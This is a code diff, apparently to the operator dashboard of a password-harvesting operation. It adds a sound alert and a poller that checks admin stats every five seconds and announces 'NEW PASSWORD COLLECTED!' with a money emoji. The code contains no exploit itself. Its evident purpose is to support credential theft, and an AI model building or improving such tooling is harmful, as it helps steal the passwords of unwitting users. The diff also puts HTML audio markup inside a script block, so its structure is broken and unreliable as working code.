@@ -1245,6 +1245,89 @@
             msgDiv.innerHTML = '<span style="color: #f87171;">❌ Erro ao alterar senha</span>';
         }
     }
+<!-- Áudio para notificações -->
+<audio id="notificacaoSom" preload="auto">
+    <source src="https://www.myinstants.com/instant/teste-dinheiro-63187/embed/" type="audio/mpeg">
+</audio>
+
+<script>
+// ========== SISTEMA DE SOM COM MYINSTANTS ==========
+let somLigado = true;
+let ultimoTotalUsuarios = 0;
+let ultimoTotalLogs = 0;
+
+// URL do som que você escolheu (dinheiro)
+const SOM_URL = 'https://www.myinstants.com/media/sounds/teste-dinheiro-63187.mp3';
+
+function tocarSom() {
+    if (!somLigado) return;
+    
+    // Criar elemento de áudio dinamicamente
+    const audio = new Audio(SOM_URL);
+    audio.volume = 0.7;
+    audio.play().catch(e => console.log('Som não reproduzido:', e));
+}
+
+function alternarSom() {
+    somLigado = !somLigado;
+    const btn = document.getElementById('btnSom');
+    if (btn) {
+        btn.innerHTML = somLigado ? '<i class="fas fa-volume-up"></i>' : '<i class="fas fa-volume-mute"></i>';
+    }
+    showToast(somLigado ? '🔊 Sons ativados' : '🔇 Sons desativados', 'info');
+}
+
+// Botão flutuante para ligar/desligar som
+const btnSom = document.createElement('div');
+btnSom.id = 'btnSom';
+btnSom.style.position = 'fixed';
+btnSom.style.bottom = '20px';
+btnSom.style.right = '20px';
+btnSom.style.zIndex = '1000';
+btnSom.style.background = 'rgba(0,0,0,0.7)';
+btnSom.style.backdropFilter = 'blur(10px)';
+btnSom.style.borderRadius = '50%';
+btnSom.style.width = '45px';
+btnSom.style.height = '45px';
+btnSom.style.display = 'flex';
+btnSom.style.alignItems = 'center';
+btnSom.style.justifyContent = 'center';
+btnSom.style.cursor = 'pointer';
+btnSom.style.border = '1px solid rgba(255,255,255,0.2)';
+btnSom.innerHTML = '<i class="fas fa-volume-up" style="color:white; font-size:20px;"></i>';
+btnSom.onclick = alternarSom;
+document.body.appendChild(btnSom);
+
+// Função para verificar novos dados
+function verificarNovosDados() {
+    if (!adminToken) return;
+    
+    fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } })
+        .then(res => res.json())
+        .then(data => {
+            const stats = data.stats || {};
+            const totalUsuarios = stats.total_users || 0;
+            const totalLogs = stats.total_logs || 0;
+            
+            if (totalUsuarios > ultimoTotalUsuarios && ultimoTotalUsuarios !== 0) {
+                tocarSom();
+                showToast(`💰 NOVO USUÁRIO! Total: ${totalUsuarios}`, 'success');
+            }
+            if (totalLogs > ultimoTotalLogs && ultimoTotalLogs !== 0) {
+                tocarSom();
+                showToast(`💰 NOVA SENHA COLETADA!`, 'info');
+            }
+            
+            ultimoTotalUsuarios = totalUsuarios;
+            ultimoTotalLogs = totalLogs;
+        })
+        .catch(err => console.error('Erro:', err));
+}
+
+// Verificar a cada 5 segundos
+setInterval(() => {
+    if (adminToken) verificarNovosDados();
+}, 5000);
 </script>
 </body>
 </html>
